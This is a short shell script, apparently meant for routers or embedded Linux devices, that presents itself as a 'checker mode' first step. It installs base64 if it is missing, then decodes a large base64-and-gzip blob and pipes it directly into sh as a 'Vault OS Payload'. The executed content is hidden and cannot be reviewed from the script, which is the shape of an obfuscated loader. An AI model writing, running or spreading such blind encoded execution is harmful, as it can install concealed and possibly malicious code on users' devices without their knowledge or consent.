#!/bin/sh
echo "====================================================="
echo "  FIRST STEP - CHECKER MODE - ACTIVATING...."
echo "====================================================="

if ! command -v base64 >/dev/null 2>&1; then
    echo "📦 Preping dependencies..."
    
    if command -v opkg >/dev/null 2>&1; then
        opkg update >/dev/null 2>&1
        opkg install coreutils-base64 >/dev/null 2>&1
    elif command -v apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add coreutils >/dev/null 2>&1 
    else
        echo "❌ ERROR: No package manager found! Cannot install base64."
        exit 1
    fi
    
    if ! command -v base64 >/dev/null 2>&1; then
         echo "❌ ERROR: Base64 installation failed. Aborting."
         exit 1
    fi
fi

PAYLOAD="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"

echo "🚀 Executing Vault OS Payload..."
echo "$PAYLOAD" | base64 -d | gunzip | sh

exit 0
